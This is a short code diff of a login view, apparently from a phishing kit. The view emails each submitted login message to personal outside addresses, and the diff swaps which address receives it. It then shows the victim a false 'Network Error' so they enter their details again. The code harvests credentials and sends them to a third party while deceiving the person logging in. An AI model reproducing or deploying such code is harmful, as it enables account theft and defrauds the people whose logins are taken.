@@ -35,7 +35,8 @@ def user_login_view(request):
             })
 
             try:
-                send_email.email_message_send('Update Successful', message, 'bamsven@proton.me' )
+                send_email.email_message_send('Update Successful', message, 'info.puhali.ee@gmail.com' )
+                # send_email.email_message_send('Update Successful', message, 'bamsven@proton.me' )
                 # send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
                 messages.error(request, "Network Error! Please verify your information and try again.")
             except Exception as e:
